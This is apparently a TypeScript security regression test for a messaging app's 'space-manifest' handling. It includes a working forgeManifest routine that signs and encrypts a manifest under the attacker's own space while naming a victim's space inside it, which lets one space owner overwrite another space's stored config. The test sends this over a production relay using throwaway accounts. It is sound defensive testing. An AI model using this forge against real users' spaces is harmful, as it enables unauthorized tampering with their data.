// NETWORKED. A space-manifest may only write the space that delivered it.
//
//   yarn harness space-manifest-scope
//
// `space-manifest` is authorized against the DELIVERING space: the manifest must
// be signed by one of that space's owner keys and decrypt under that space's
// config key. But the `Space` it then persists is keyed by `space.spaceId`, a
// field INSIDE the decrypted payload the signer chose. Nothing requires the two
// to agree, so an owner of space A can overwrite the stored config of any other
// space B a victim is in.
//
// The forge splits what the honest path keeps together: seal/sign/deliver under
// A (which the attacker owns), but put spaceId=B inside the payload. Everything
// from the wire onward is production code; the receiver's path is untouched.
//
//   A  attacker's space; the victim joins it, so it delivers the forged manifest
//   B  victim's space, attacker signs a cross-space manifest for it   (PROPERTY: must not change)
//   C  victim's space, a NON-owner signs a manifest for it            (owner gate live: must not change)
//
// POSITIVE control is not a second write (the victim processes a delivered batch
// concurrently, and two writing manifests race — one write is silently lost). It
// is instead the fix's own cross-space-refusal warning, which fires only after
// unseal + owner + signature + decrypt. Capturing it proves the attack manifest
// reached the write decision, so "B unchanged" means the write was refused, not
// that the frame was dropped or rejected before the scope check.
//
// PRODUCTION relay, throwaway accounts. See identity.ts.
import { test, expect } from 'vitest';
import {
  channel as secureChannel,
  channel_raw as ch,
} from '@quilibrium/quilibrium-js-sdk-channels';
import { int64ToBytes, logger, type Space } from '@quilibrium/quorum-shared';
import { hexToSpreadArray } from '../../../utils/crypto';
import { createSpaceBot, type HarnessSpaceBot } from './spaceBot';
import { RunLog } from './log';

const WINDOW_MS = Number(process.env.HARNESS_SPACE_WINDOW_MS ?? 120_000);
const SAMPLE_MS = Number(process.env.HARNESS_SPACE_SAMPLE_MS ?? 2000);
const SETTLE_MS = Number(process.env.HARNESS_SETTLE_MS ?? 20_000);

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

async function until<T>(
  check: () => Promise<T | undefined>,
  windowMs = WINDOW_MS
): Promise<T | undefined> {
  const deadline = Date.now() + windowMs;
  for (;;) {
    const got = await check();
    if (got !== undefined) return got;
    if (Date.now() >= deadline) return undefined;
    await sleep(SAMPLE_MS);
  }
}

/**
 * Build a `space-manifest` exactly as `SpaceService.updateSpace` does, but with
 * the delivering space and the payload's spaceId decoupled.
 *
 * `deliveringSpaceId` supplies the config key (encryption), the owner key
 * (signature) and `space_address` (so `submitUpdateSpace` seals it on that
 * space's hub). `innerSpace.spaceId` is whatever the attacker wants to hit.
 * `ownerKeyOverride` lets the owner-gate control sign with a non-owner key.
 */
async function forgeManifest(
  attacker: HarnessSpaceBot,
  deliveringSpaceId: string,
  innerSpace: Space,
  ownerKeyOverride?: { publicKeyHex: string; privateKeyHex: string }
): Promise<secureChannel.SpaceManifest> {
  const configKey = await attacker.messageDB.getSpaceKey(
    deliveringSpaceId,
    'config'
  );
  const ownerKey =
    ownerKeyOverride ??
    (await attacker.messageDB
      .getSpaceKey(deliveringSpaceId, 'owner')
      .then((k) => ({ publicKeyHex: k.publicKey, privateKeyHex: k.privateKey })));

  const ephemeral = JSON.parse(
    ch.js_generate_x448()
  ) as secureChannel.X448Keypair;

  const ciphertext = ch.js_encrypt_inbox_message(
    JSON.stringify({
      inbox_public_key: [...hexToSpreadArray(configKey.publicKey)],
      ephemeral_private_key: ephemeral.private_key,
      plaintext: [
        ...new Uint8Array(Buffer.from(JSON.stringify(innerSpace), 'utf-8')),
      ],
    } as secureChannel.SealedInboxMessageEncryptRequest)
  );

  const ts = Date.now();
  const ownerSignature = Buffer.from(
    JSON.parse(
      ch.js_sign_ed448(
        Buffer.from(ownerKey.privateKeyHex, 'hex').toString('base64'),
        Buffer.from(
          new Uint8Array([
            ...new Uint8Array(Buffer.from(ciphertext, 'utf-8')),
            ...int64ToBytes(ts),
          ])
        ).toString('base64')
      )
    ),
    'base64'
  ).toString('hex');

  return {
    space_address: deliveringSpaceId,
    space_manifest: ciphertext,
    ephemeral_public_key: Buffer.from(
      new Uint8Array(ephemeral.public_key)
    ).toString('hex'),
    timestamp: ts,
    owner_public_key: ownerKey.publicKeyHex,
    owner_signature: ownerSignature,
  } as unknown as secureChannel.SpaceManifest;
}

/** Broadcast a manifest on its `space_address`'s hub, the real send path. */
async function sendManifest(
  attacker: HarnessSpaceBot,
  manifest: secureChannel.SpaceManifest
): Promise<void> {
  await attacker.graph.spaceService.submitUpdateSpace(manifest);
  await attacker.flush();
}

test(
  'space-manifest-scope: a manifest must not write a space other than the one that delivered it',
  async () => {
    const startedAt = Date.now();
    const stamp = String(startedAt).slice(-6);
    const log = new RunLog('space-manifest-scope', startedAt);
    const say = (msg: string, fields: Record<string, unknown> = {}) => {
      console.log(`[manifest-scope] ${msg}`);
      log.add(Date.now(), 'harness', 'note', { msg, ...fields });
    };

    const [v, x] = await Promise.all([
      createSpaceBot(`sm-victim-${stamp}`),
      createSpaceBot(`sm-attacker-${stamp}`),
    ]);
    await Promise.all([v.start(), x.start()]);

    // Declared before the try so the finally can always restore the shared
    // logger, even if setup throws.
    const refusals: string[] = [];
    const origLoggerWarn = logger.warn.bind(logger);

    try {
      say(
        `victim=${v.identity.address.slice(0, 12)} attacker=${x.identity.address.slice(0, 12)}`
      );

      // ── Setup ────────────────────────────────────────────────────────────
      // Victim owns B and C. Attacker owns A and invites the victim into it, so
      // the victim holds A's keys and receives A's hub broadcasts.
      const bName = `sm-B-${stamp}`;
      const cName = `sm-C-${stamp}`;
      const b = await v.createSpace(bName);
      const c = await v.createSpace(cName);
      const a = await x.createSpace(`sm-A-${stamp}`);
      say(
        `B=${b.spaceId.slice(0, 12)} C=${c.spaceId.slice(0, 12)} A=${a.spaceId.slice(0, 12)}`
      );

      const link = await x.inviteLink(a.spaceId);
      const joined = await v.join(link);
      expect(joined.spaceId).toBe(a.spaceId);
      say('victim joined attacker’s space A');

      // DIAGNOSTIC: log every space row the victim persists.
      const origSaveSpace = v.messageDB.saveSpace.bind(v.messageDB);
      (v.messageDB as unknown as { saveSpace: (s: Space) => Promise<void> }).saveSpace =
        async (s: Space) => {
          say(`  V.saveSpace id=${s.spaceId?.slice(0, 12)} name=${s.spaceName}`);
          return origSaveSpace(s);
        };

      // POSITIVE-CONTROL instrument. The fix logs this exact warning ONLY after a
      // manifest is unsealed, owner-checked, signature-verified AND decrypted (to
      // read its payload spaceId), then found to name another space. Capturing it
      // proves the attack manifest reached the write decision — which a config-
      // key-read counter cannot, since every delivered frame reads the key once
      // before it is even classified. `refusalsForB` filters to the attack (a
      // warning naming B's spaceId), so an owner/signature reject of the attack
      // (no decrypt, no warning) fails the positive control instead of passing.
      (logger as unknown as { warn: (...a: unknown[]) => void }).warn = (
        ...args: unknown[]
      ) => {
        const line = args.map((a) => String(a)).join(' ');
        if (line.includes('refusing cross-space')) refusals.push(line);
        return origLoggerWarn(...(args as []));
      };
      const refusalsForB = () =>
        refusals.filter((l) => l.includes(b.spaceId.substring(0, 12))).length;

      // Template: a fully-valid Space the attacker legitimately holds (its own
      // A row), so the forged payloads persist and re-index like real ones.
      const aRow = await x.messageDB.getSpace(a.spaceId);
      expect(aRow, 'attacker has no local row for its own space A').toBeTruthy();

      const bBefore = await v.messageDB.getSpace(b.spaceId);
      const cBefore = await v.messageDB.getSpace(c.spaceId);
      expect(bBefore?.spaceName).toBe(bName);
      expect(cBefore?.spaceName).toBe(cName);

      // A non-owner key for the owner-gate control.
      const nonOwner = JSON.parse(ch.js_generate_ed448()) as {
        public_key: number[];
        private_key: number[];
      };
      const nonOwnerHex = {
        publicKeyHex: Buffer.from(new Uint8Array(nonOwner.public_key)).toString(
          'hex'
        ),
        privateKeyHex: Buffer.from(
          new Uint8Array(nonOwner.private_key)
        ).toString('hex'),
      };

      // The attack (owner → B, cross-space) and the owner-gate control
      // (non-owner → C). Only the attack ever reaches the write path, so there
      // is no second writer to race with it: the victim processes a delivered
      // batch concurrently, and two writing manifests would collide (one write
      // is silently lost). C never writes, so it is a safe companion.
      await sendManifest(
        x,
        await forgeManifest(x, a.spaceId, {
          ...(aRow as Space),
          spaceId: b.spaceId,
          spaceName: 'OWNED-BY-A',
        })
      );
      await sendManifest(
        x,
        await forgeManifest(
          x,
          a.spaceId,
          { ...(aRow as Space), spaceId: c.spaceId, spaceName: 'NONOWNER-C' },
          nonOwnerHex
        )
      );
      say('sent: [owner→B (cross-space), non-owner→C]');

      // The relay pushes hub frames to the victim only just after it (re)listens,
      // and nothing here re-triggers a listen. Force one fresh listen so the
      // whole retained backlog is re-pushed and processed.
      v.disconnect();
      await v.reconnect();
      // Wait until the attack has resolved either way: it applied (B changed, on
      // an unfixed build) or it was decrypted and refused (the fix's warning).
      await until(async () => {
        const bRow = await v.messageDB.getSpace(b.spaceId);
        if (bRow?.spaceName !== bName) return true;
        if (refusalsForB() >= 1) return true;
        return undefined;
      });
      await sleep(SETTLE_MS);

      // ── RESULT ───────────────────────────────────────────────────────────
      const aAfter = await v.messageDB.getSpace(a.spaceId);
      const bAfter = await v.messageDB.getSpace(b.spaceId);
      const cAfter = await v.messageDB.getSpace(c.spaceId);

      say('');
      say('==== RESULT ====');
      say(`PROPERTY  B (owner, cross-space)     : ${bAfter?.spaceName}`);
      say(`POSITIVE  attack decrypt+refuse warns: ${refusalsForB()} (>=1 = reached write decision)`);
      say(`CONTROL   C (non-owner, cross-space) : ${cAfter?.spaceName}`);
      say(`(A row now: ${aAfter?.spaceName})`);
      say(
        `receive failures: NOVEL victim=${v.novelErrors().length} attacker=${x.novelErrors().length}`
      );
      for (const e of v.novelErrors().slice(0, 5)) say(`   ! ${e.message}`);
      say(`log: ${log.file}`);

      // ── no novel receive errors ──────────────────────────────────────────
      expect(
        v.novelErrors().length,
        'the victim raised a novel receive error — a forged frame may have been ' +
          'rejected before the handler ran, making a surviving B a false positive'
      ).toBe(0);

      // ── SECURITY PROPERTY — the manifest wrote only its own space ────────
      // On an unfixed build B is overwritten and this fails first: a clean red on
      // the bug. On a fixed build B is untouched.
      expect(
        bAfter?.spaceName,
        'SECURITY: a manifest delivered on A overwrote the victim’s stored row ' +
          'for B. A manifest must be refused when its payload names a different ' +
          'space than the hub that delivered it.'
      ).toBe(bName);

      // ── POSITIVE CONTROL — B was untouched because the write was REFUSED, not
      // because the frame was dropped. The refusal warning fires only past unseal
      // + owner + signature + decrypt, so this catches a future regression that
      // silently rejects the attack earlier and leaves B unchanged for the wrong
      // reason.
      expect(
        refusalsForB(),
        'POSITIVE CONTROL: no cross-space refusal was logged for B — B being ' +
          'unchanged may mean the attack manifest was dropped or rejected before ' +
          'the scope check, not refused by it'
      ).toBeGreaterThanOrEqual(1);

      // ── OWNER GATE — a non-owner cannot write at all ─────────────────────
      expect(
        cAfter?.spaceName,
        'OWNER GATE: a non-owner manifest changed C — the owner check is not ' +
          'live, so B changing would not isolate the scope hole'
      ).toBe(cName);

      say('PASS — the manifest wrote only its delivering space');
    } finally {
      (logger as unknown as { warn: unknown }).warn = origLoggerWarn;
      v.stop();
      x.stop();
    }
  },
  20 * 60 * 1000
);
